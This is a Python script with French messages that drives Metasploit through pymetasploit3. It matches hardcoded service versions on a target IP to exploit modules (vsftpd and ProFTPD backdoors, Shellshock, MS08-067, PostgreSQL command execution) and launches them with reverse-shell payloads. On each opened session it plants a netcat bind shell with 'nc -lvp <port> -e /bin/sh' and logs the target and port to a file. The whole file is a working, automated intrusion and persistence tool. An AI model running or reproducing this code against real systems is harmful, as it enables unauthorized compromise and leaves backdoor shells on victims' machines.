from pymetasploit3.msfrpc import MsfRpcClient
import nmap
import random




def metasploit_search_exploits(services, msf_client):
    exploits = []

    known_exploits = {
        "ftp 2.3.4": "exploit/unix/ftp/vsftpd_234_backdoor",
        "http 2.4.10": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "netbios-ssn 3.X - 4.X": "exploit/windows/smb/ms08_067_netapi",
        "ftp 1.3.1": "exploit/unix/ftp/proftpd_133c_backdoor",
        "mysql": "exploit/multi/mysql/mysql_login",
        "http 2.4.38": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "postgresql 9.6.0 or later": "exploit/multi/postgres/postgres_copy_from_program_cmd_exec",
    }

    for port, service, version in services:
        search_term = f"{service} {version}"
        print(f"Recherche d'exploits pour : {search_term}")
        if search_term in known_exploits:
            exploits.append((port, service, version, known_exploits[search_term]))
        else:
            print(f"Aucun exploit connu trouvé pour : {search_term}")

    return exploits


def execute_exploits(target_ip, exploits, msf_client):
    while True:
        for port, service, version, exploit_name in exploits:
            print(f"Exécution de l'exploit {exploit_name} pour {service} {version} sur le port {port}")

            exploit = msf_client.modules.use('exploit', exploit_name)
            exploit['RHOSTS'] = target_ip
            exploit['RPORT'] = port

            try:
                if exploit_name == "exploit/unix/ftp/vsftpd_234_backdoor":
                    payload = 'cmd/unix/interact'
                else:
                    payload = 'generic/shell_reverse_tcp'

                exploit.target = 0
                job_id = exploit.execute(payload=payload)
                print(f"Exploit lancé avec succès. Job ID: {job_id}")

                if msf_client.sessions.list:
                    print("Sessions disponibles : ")
                    for s in msf_client.sessions.list.keys():
                        print(s)

                    session = msf_client.sessions.session(s)

                    random_port = random.randint(10000, 10100)

                    session.write(f"nc -lvp {random_port} -e /bin/sh")

                    output = session.read()
                    print(output)

                    if "listening on [any]" in output:
                        with open("sessions.txt", "a") as f:
                            f.write(f"IP: {target_ip}, Port: {random_port}\n")

                        # Fermer la session
                        

                        return True
                    else:
                        print("La session n'a pas écouté sur le port. Passage à l'exploit suivant.")
                else:
                    print("Aucune session disponible. Passage à l'exploit suivant.")

            except ValueError as e:
                print(f"Erreur lors de l'exécution de l'exploit : {e}")


def main(target_ip, msf_password):
    services = [(21, 'ftp', '2.3.4'), (22, 'ssh', '4.7p1 Debian 8ubuntu1'), (23, 'telnet', ''), (25, 'smtp', ''), (80, 'http', '2.4.10'), (111, 'rpcbind', '2'), (139, 'netbios-ssn', '3.X - 4.X'), (445, 'netbios-ssn', '3.X - 4.X'), (512, 'exec', ''), (513, 'login', ''), (514, 'tcpwrapped', ''), (631, 'ipp', '2.4'), (1099, 'java-rmi', ''), (1524, 'ingreslock', ''), (2121, 'ftp', '1.3.1'), (3306, 'mysql', ''), (5000, 'http', '2.4.38'), (5432, 'postgresql', '9.6.0 or later'), (5900, 'vnc', ''), (6000, 'X11', ''), (6667, 'irc', ''), (8009, 'ajp13', ''), (8080, 'http', '2.4.38'), (8180, 'http', '1.1')]
    client = MsfRpcClient(msf_password, port=55552)
    print("connecté")
    exploits = metasploit_search_exploits(services, client)
    if exploits:
        print("Exploits trouvés:")
        for port, service, version, exploit in exploits:
            print(f"Port: {port}, Service: {service}, Version: {version}")
            print(f"  - {exploit}")
    else:
        print("Aucun exploit trouvé pour les services et versions détectés.")
    
    execute_exploits(target_ip, exploits, client)

if __name__ == "__main__":
    import sys
    target_ip = sys.argv[1]
    msf_password = sys.argv[2]
    main(target_ip, msf_password)
